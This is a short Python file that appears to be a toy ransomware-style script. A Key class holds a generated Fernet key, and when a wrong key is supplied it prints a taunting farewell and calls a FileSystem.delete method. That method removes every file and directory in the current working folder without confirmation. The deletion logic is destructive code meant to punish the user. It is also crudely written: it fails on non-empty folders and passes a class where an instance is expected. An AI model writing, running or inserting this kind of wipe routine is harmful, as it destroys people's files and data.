from cryptography.fernet import Fernet
import os 

class FileSystem:
    def delete(self):
        for file in os.listdir():
            if os.path.isfile(file):
                os.remove(file)
            else:
                os.rmdir(file)
    
class Key:
    def __init__(self):
        self.key = Fernet.generate_key()
        
    def delete_key(self, key, FileSystem):
        if key != self.key:
            print("Might as well say goodbye to your files and directories now!")
            FileSystem.delete()

